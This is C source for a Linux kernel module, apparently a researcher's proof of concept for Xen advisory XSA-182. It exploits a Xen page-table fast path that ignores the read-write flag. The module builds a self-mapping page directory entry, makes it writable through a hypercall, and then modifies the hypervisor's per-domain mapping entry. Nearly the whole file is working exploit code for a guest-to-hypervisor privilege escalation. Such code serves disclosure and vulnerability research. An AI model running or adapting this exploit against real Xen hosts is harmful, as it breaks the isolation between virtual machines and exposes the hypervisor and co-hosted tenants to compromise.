#include <linux/module.h>
#include <linux/sched.h>
#include <asm/xen/hypercall.h>
#include <asm/xen/page.h>

#define DEBUG(_f, _a...) printk(KERN_INFO "xsa-182-poc:%d - " _f "\n", __LINE__, ## _a)
#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)
#define __mfn(_v) ((unsigned long) (__machine_addr(_v) >> PAGE_SHIFT))

int mmu_update(unsigned long ptr, unsigned long val)
{
    struct mmu_update mmu_updates;
    struct mmuext_op uops_tlb_flush_all[] = {{.cmd =  MMUEXT_TLB_FLUSH_ALL}};
    int rc;

    mmu_updates.ptr = ptr | MMU_NORMAL_PT_UPDATE;
    mmu_updates.val = val;
    rc = HYPERVISOR_mmu_update(&mmu_updates, 1, NULL, DOMID_SELF);
    HYPERVISOR_mmuext_op(uops_tlb_flush_all, 1, NULL, DOMID_SELF);

    return rc;
}

static int __init exploit_init(void)
{
    int xen_version = HYPERVISOR_xen_version(0, NULL);
    unsigned long *page_directory = (unsigned long *) (current->mm->pgd);
    unsigned long val_to_copy = 0;
    const unsigned long self_number = 42;
    /*
     from xen/include/asm-x86/config.h
     *  0xffff820000000000 - 0xffff827fffffffff [512GB, 2^39 bytes, PML4:260]
     *    Per-domain mappings (e.g., GDT, LDT).
    */
    const unsigned long target = 260;
    unsigned long *writable_page_directory = NULL;
    int rc;

    DEBUG("xen_version = %d.%d", (xen_version >> 16) & 0xFFFF, xen_version & 0xFFFF);
    DEBUG("page_directory mfn = 0x%lx", __mfn(page_directory));
    DEBUG("page_directory[%lu] = 0x%016lx", target, page_directory[target]);
    DEBUG("page_directory[%lu] = 0x%016lx", self_number, page_directory[self_number]);

    // create a self-mapping entry without RW flag
    rc = mmu_update(__machine_addr(&page_directory[self_number]), __machine_addr(page_directory) | _PAGE_USER | _PAGE_PRESENT);
    DEBUG("rc = 0x%x", rc);
    DEBUG("page_directory[%lu] = 0x%016lx", self_number, page_directory[self_number]);

    // fast path doesn't check RW flag ...
    val_to_copy = page_directory[self_number] | _PAGE_RW;
    rc = HYPERVISOR_arbitrary_access((unsigned long) __machine_addr(&page_directory[self_number]), (const void *) &val_to_copy, sizeof(unsigned long), ARBITRARY_WRITE | ARBITRARY_VERBOSE);
    DEBUG("rc = 0x%x", rc);
    DEBUG("page_directory[%lu] = 0x%016lx", self_number, page_directory[self_number]);
    if (rc != 0) {
        DEBUG("not vulnerable");
        goto end;
    }

    // craft magic address
    writable_page_directory = (unsigned long*) ((self_number << 39) | (self_number << 30) | (self_number << 21) | (self_number << 12));
    DEBUG("writable_page_directory = 0x%p", writable_page_directory);

    // enjoy
    DEBUG("writable_page_directory[%lu] = 0x%016lx", target, writable_page_directory[target]);
    writable_page_directory[target] |= _PAGE_USER;
    DEBUG("writable_page_directory[%lu] = 0x%016lx", target, writable_page_directory[target]);
    DEBUG("vulnerable");

end:
    // reset entry because Linux is trying to unpin page & so on
    rc = mmu_update(__machine_addr(&page_directory[self_number]), 0x0);
    DEBUG("rc = 0x%x", rc);

    return 0;
}

static void __exit exploit_exit(void)
{
    printk("goodbye!\n");
}

module_init(exploit_init);
module_exit(exploit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jérémie Boutoille");
MODULE_DESCRIPTION("XSA-182 proof of concept");
